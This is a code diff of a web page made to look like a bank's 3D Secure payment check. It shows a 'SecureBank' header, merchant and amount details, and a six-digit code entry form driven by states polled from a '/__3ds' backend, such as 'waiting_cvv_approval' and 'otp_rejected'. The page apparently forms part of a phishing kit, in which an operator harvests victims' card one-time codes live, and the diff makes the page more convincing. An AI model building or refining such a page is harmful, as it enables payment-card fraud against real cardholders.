@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>3D Secure Verification</title>
     <style>
         * {
             margin: 0;
@@ -12,96 +12,152 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            -webkit-font-smoothing: antialiased;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        .bank-header {
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+            padding: 18px 28px;
+            border-radius: 10px 10px 0 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .bank-logo {
+            color: white;
+            font-size: 19px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: rgba(255,255,255,0.8);
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+        .secure-badge svg {
+            width: 13px;
+            height: 13px;
+            fill: rgba(255,255,255,0.8);
         }
         .card {
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            max-width: 450px;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+            padding: 28px 28px 24px;
             width: 100%;
-            text-align: center;
         }
-        .logo {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 20px;
-            background: #006fc9;
-            border-radius: 50%;
+        .merchant-info {
+            background: #f8f9fb;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 22px;
+        }
+        .merchant-row {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 28px;
-            font-weight: bold;
+            font-size: 13px;
+            color: #5a6c7d;
+            margin-bottom: 6px;
+        }
+        .merchant-row:last-child {
+            margin-bottom: 0;
+        }
+        .merchant-row .label {
+            font-weight: 500;
+        }
+        .merchant-row .value {
+            color: #1a237e;
+            font-weight: 600;
+        }
+        .merchant-row.amount .value {
+            font-size: 17px;
         }
         h1 {
-            color: #1a1a1a;
-            font-size: 22px;
-            margin-bottom: 10px;
+            color: #1a1a2e;
+            font-size: 18px;
+            margin-bottom: 6px;
             font-weight: 600;
         }
         .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
+            color: #6b7c93;
+            font-size: 13px;
+            margin-bottom: 22px;
             line-height: 1.5;
         }
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #e0e0e0;
-            border-top-color: #006fc9;
+            width: 38px;
+            height: 38px;
+            border: 3px solid #e0e7ef;
+            border-top-color: #1a237e;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 20px auto;
+            margin: 22px auto;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         .otp-form {
             display: none;
-            margin-top: 20px;
         }
         .otp-form.active {
             display: block;
         }
         .otp-label {
             display: block;
-            text-align: left;
-            color: #333;
-            font-size: 14px;
-            margin-bottom: 8px;
+            color: #32325d;
+            font-size: 13px;
             font-weight: 500;
+            margin-bottom: 10px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 12px;
         }
         .otp-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 18px;
+            flex: 1;
+            min-width: 0;
+            width: 0;
+            height: 48px;
+            border: 1.5px solid #dce3ec;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: 600;
             text-align: center;
-            letter-spacing: 8px;
+            color: #32325d;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border-color 0.15s, box-shadow 0.15s;
+            background: #f8f9fb;
         }
         .otp-input:focus {
-            border-color: #006fc9;
+            border-color: #1a237e;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(26, 35, 126, 0.1);
         }
         .otp-input.error {
-            border-color: #e74c3c;
-            background: #fdf2f2;
+            border-color: #e53935;
+            background: #fef5f5;
         }
         .error-message {
-            color: #e74c3c;
-            font-size: 13px;
-            margin-top: 10px;
+            color: #e53935;
+            font-size: 12px;
+            margin-bottom: 12px;
+            text-align: center;
             display: none;
         }
         .error-message.show {
@@ -109,77 +165,162 @@
         }
         .submit-btn {
             width: 100%;
-            padding: 14px;
-            background: #006fc9;
+            height: 46px;
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.2s;
+            transition: opacity 0.15s, transform 0.1s;
         }
         .submit-btn:hover {
-            background: #005ba8;
+            opacity: 0.95;
+        }
+        .submit-btn:active {
+            transform: translateY(1px);
         }
         .submit-btn:disabled {
-            background: #aaa;
+            background: #c0c7d6;
             cursor: not-allowed;
         }
-        .info-text {
-            color: #888;
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 14px;
             font-size: 12px;
-            margin-top: 15px;
-            line-height: 1.5;
+        }
+        .resend-row .hint {
+            color: #8898aa;
+        }
+        .resend-link {
+            color: #1a237e;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
         }
         .expired-state, .completed-state {
             display: none;
+            text-align: center;
+            padding: 10px 0;
         }
         .expired-state.show, .completed-state.show {
             display: block;
         }
-        .expired-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-        }
         .success-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            color: #27ae60;
+            width: 60px;
+            height: 60px;
+            background: #43a047;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 28px;
+            animation: popIn 0.4s ease-out;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            70% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .expired-icon {
+            font-size: 44px;
+            margin-bottom: 12px;
+        }
+        .completed-state h2, .expired-state h2 {
+            color: #1a1a2e;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .completed-state p, .expired-state p {
+            color: #6b7c93;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 11px;
+            color: #a0aec0;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">✓</div>
-        <h1 id="title">Secure Verification</h1>
-        <p class="subtitle" id="subtitle">Please wait while we verify your information...</p>
-
-        <!-- Loading state -->
-        <div id="loading-state">
-            <div class="spinner"></div>
+    <div class="container">
+        <div class="bank-header">
+            <div class="bank-logo">SecureBank</div>
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                </svg>
+                3D SECURE
+            </div>
         </div>
 
-        <!-- OTP Form state -->
-        <div id="otp-form" class="otp-form">
-            <label class="otp-label" for="otp">Enter verification code</label>
-            <input type="text" id="otp" class="otp-input" maxlength="8" placeholder="••••••" autocomplete="off">
-            <div id="error-msg" class="error-message">Incorrect verification code. Please try again.</div>
-            <button class="submit-btn" id="submit-btn" onclick="submitOTP()">Submit</button>
-            <p class="info-text">A verification code has been sent to your registered phone number.</p>
+        <div class="card">
+            <div class="merchant-info">
+                <div class="merchant-row">
+                    <span class="label">Merchant</span>
+                    <span class="value">Online Store Inc.</span>
+                </div>
+                <div class="merchant-row amount">
+                    <span class="label">Amount</span>
+                    <span class="value">$129.00 USD</span>
+                </div>
+            </div>
+
+            <h1 id="title">Verify Your Identity</h1>
+            <p class="subtitle" id="subtitle">Your bank requires additional verification to confirm this payment.</p>
+
+            <!-- Loading state -->
+            <div id="loading-state">
+                <div class="spinner"></div>
+            </div>
+
+            <!-- OTP Form state -->
+            <div id="otp-form" class="otp-form">
+                <label class="otp-label">Enter the 6-digit security code sent to your phone</label>
+                <div class="otp-inputs" id="otp-inputs">
+                    <input type="text" class="otp-input" maxlength="1" data-index="0" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div id="error-msg" class="error-message">Incorrect security code. Please try again.</div>
+                <button class="submit-btn" id="submit-btn" onclick="submitOTP()">Verify</button>
+                <div class="resend-row">
+                    <span class="hint">Didn't get the code?</span>
+                    <a class="resend-link" onclick="resendCode()">Resend</a>
+                </div>
+            </div>
+
+            <!-- Expired state -->
+            <div id="expired-state" class="expired-state">
+                <div class="expired-icon">&#9201;</div>
+                <h2>Session Expired</h2>
+                <p>Your verification session has timed out for security reasons.<br>Please return to the merchant and try again.</p>
+            </div>
+
+            <!-- Completed state -->
+            <div id="completed-state" class="completed-state">
+                <div class="success-icon">&#10003;</div>
+                <h2>Verification Successful</h2>
+                <p>Your payment has been verified.<br>You will be redirected shortly...</p>
+            </div>
         </div>
 
-        <!-- Expired state -->
-        <div id="expired-state" class="expired-state">
-            <div class="expired-icon">⏱️</div>
-            <p class="subtitle">Your verification session has expired.<br>Please go back and try again.</p>
-        </div>
-
-        <!-- Completed state -->
-        <div id="completed-state" class="completed-state">
-            <div class="success-icon">✓</div>
-            <p class="subtitle">Verification successful!<br>You will be redirected shortly...</p>
+        <div class="footer">
+            Secure transaction guaranteed
         </div>
     </div>
 
@@ -189,10 +330,13 @@
         var basePath = '/__3ds';
         var pollTimer = null;
         var pollCount = 0;
-        var maxPolls = 300; // 10 minutes at 2s intervals
+        var maxPolls = 300;
         var currentState = '';
         var lastOTPCount = 0;
         var submitting = false;
+        var resendCooldown = 60;
+        var resendTimer = null;
+        var resending = false;
 
         function getAPIUrl(endpoint) {
             return basePath + '/' + endpoint + '?sid=' + encodeURIComponent(sessionId);
@@ -208,27 +352,50 @@
         }
 
         function showOTPForm() {
-            document.getElementById('title').textContent = 'Verify Your Identity';
-            document.getElementById('subtitle').textContent = 'Please enter the verification code sent to your phone.';
+            document.getElementById('title').textContent = 'Enter Verification Code';
+            document.getElementById('subtitle').textContent = 'We\'ve sent a 6-digit code to your phone. Please enter it below to continue.';
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.add('active');
             document.getElementById('expired-state').classList.remove('show');
             document.getElementById('completed-state').classList.remove('show');
             document.getElementById('error-msg').classList.remove('show');
-            document.getElementById('otp').classList.remove('error');
-            document.getElementById('otp').value = '';
-            document.getElementById('otp').focus();
+            clearOTPInputs();
+            var inputs = document.querySelectorAll('.otp-input');
+            if (inputs.length > 0) {
+                inputs[0].focus();
+            }
         }
 
         function showOTPError() {
             document.getElementById('error-msg').classList.add('show');
-            document.getElementById('otp').classList.add('error');
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.classList.add('error');
+            });
             document.getElementById('submit-btn').disabled = false;
-            document.getElementById('otp').disabled = false;
+            inputs.forEach(function(input) {
+                input.disabled = false;
+            });
+        }
+
+        function clearOTPInputs() {
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.value = '';
+                input.classList.remove('error');
+            });
+        }
+
+        function getOTPValue() {
+            var inputs = document.querySelectorAll('.otp-input');
+            var otp = '';
+            inputs.forEach(function(input) {
+                otp += input.value;
+            });
+            return otp;
         }
 
         function showExpired() {
-            document.getElementById('title').textContent = 'Session Expired';
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.remove('active');
             document.getElementById('expired-state').classList.add('show');
@@ -237,7 +404,6 @@
         }
 
         function showCompleted() {
-            document.getElementById('title').textContent = 'Success';
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.remove('active');
             document.getElementById('expired-state').classList.remove('show');
@@ -255,7 +421,7 @@
                         window.location.replace(redirectUrl);
                     }
                 }
-            }, 1500);
+            }, 2000);
         }
 
         function handleState(state, redirectURL, otpCount) {
@@ -264,7 +430,7 @@
             switch (state) {
                 case 'waiting_cvv_approval':
                     if (currentState !== state) {
-                        showLoading('Secure Verification', 'Please wait while we verify your information...');
+                        showLoading('Verifying', 'Please wait while we verify your payment...');
                     }
                     break;
                 case 'otp_waiting':
@@ -277,7 +443,7 @@
                     break;
                 case 'otp_submitted':
                     if (currentState !== state) {
-                        showLoading('Verifying', 'Please wait while we verify your code...');
+                        showLoading('Processing', 'Please wait while we verify your code...');
                     }
                     break;
                 case 'otp_rejected':
@@ -337,19 +503,22 @@
         function submitOTP() {
             if (submitting) return;
 
-            var otp = document.getElementById('otp').value.trim();
-            if (!otp) {
-                document.getElementById('otp').focus();
+            var otp = getOTPValue().trim();
+            if (otp.length < 6) {
+                var inputs = document.querySelectorAll('.otp-input');
+                inputs[0].focus();
                 return;
             }
 
             submitting = true;
             document.getElementById('submit-btn').disabled = true;
-            document.getElementById('otp').disabled = true;
+            var inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(function(input) {
+                input.disabled = true;
+            });
             document.getElementById('error-msg').classList.remove('show');
-            document.getElementById('otp').classList.remove('error');
 
-            showLoading('Verifying', 'Please wait while we verify your code...');
+            showLoading('Processing', 'Please wait while we verify your code...');
             stopPolling();
 
             var xhr = new XMLHttpRequest();
@@ -384,13 +553,131 @@
             xhr.send(JSON.stringify({ otp: otp }));
         }
 
-        document.getElementById('otp').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                submitOTP();
+        function startResendCountdown() {
+            var btn = document.querySelector('.resend-link');
+            if (!btn) return;
+            var seconds = resendCooldown;
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.5';
+            btn.textContent = 'Resend in ' + seconds + 's';
+            resendTimer = setInterval(function() {
+                seconds--;
+                if (seconds <= 0) {
+                    clearInterval(resendTimer);
+                    resendTimer = null;
+                    btn.style.pointerEvents = '';
+                    btn.style.opacity = '';
+                    btn.textContent = 'Resend';
+                } else {
+                    btn.textContent = 'Resend in ' + seconds + 's';
+                }
+            }, 1000);
+        }
+
+        function resendCode() {
+            if (resending || resendTimer) return;
+
+            resending = true;
+            clearOTPInputs();
+            document.getElementById('error-msg').classList.remove('show');
+            var inputs = document.querySelectorAll('.otp-input');
+            if (inputs.length > 0) {
+                inputs[0].focus();
             }
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', getAPIUrl('resend'), true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() {
+                resending = false;
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        if (data.success) {
+                            startResendCountdown();
+                        }
+                    } catch (e) {}
+                }
+            };
+            xhr.onerror = function() {
+                resending = false;
+            };
+            xhr.send(JSON.stringify({}));
+        }
+
+        var inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach(function(input, index) {
+            input.addEventListener('input', function(e) {
+                var val = e.target.value;
+                if (val.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                if (val.length > 1) {
+                    e.target.value = val.charAt(val.length - 1);
+                }
+                if (getOTPValue().length >= 6) {
+                    submitOTP();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+                if (e.key === 'Enter') {
+                    submitOTP();
+                }
+            });
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var pastedData = (e.clipboardData || window.clipboardData).getData('text');
+                pastedData = pastedData.replace(/\D/g, '');
+                for (var i = 0; i < pastedData.length && index + i < inputs.length; i++) {
+                    inputs[index + i].value = pastedData.charAt(i);
+                }
+                var nextIndex = Math.min(index + pastedData.length, inputs.length - 1);
+                inputs[nextIndex].focus();
+                if (pastedData.length >= 6) {
+                    setTimeout(submitOTP, 100);
+                }
+            });
         });
 
-        startPolling();
+        // === Debug Mode: static preview with window.state ===
+        (function() {
+            var isDebug = location.protocol === 'file:' || location.search.indexOf('debug=1') > -1;
+            if (!isDebug) {
+                startPolling();
+                return;
+            }
+
+            var debugOTPCount = 0;
+            var debugState = 'otp_waiting';
+
+            function applyState(s) {
+                debugState = s;
+                handleState(s, 'https://example.com', debugOTPCount);
+            }
+
+            Object.defineProperty(window, 'state', {
+                get: function() { return debugState; },
+                set: function(s) { applyState(s); }
+            });
+
+            window.set3DSState = function(s, otpCount) {
+                if (otpCount !== undefined) debugOTPCount = otpCount;
+                applyState(s);
+            };
+
+            window.rejectOTP = function() {
+                debugOTPCount++;
+                applyState('otp_rejected');
+            };
+
+            console.log('%c[3DS Debug Mode]', 'color:#1a237e;font-weight:bold;');
+            console.log('Use window.state = "waiting_cvv_approval" | "otp_waiting" | "otp_submitted" | "otp_rejected" | "completed" | "expired"');
+            console.log('Or use window.rejectOTP() to simulate OTP failure');
+            applyState(debugState);
+        })();
     </script>
 </body>
 </html>
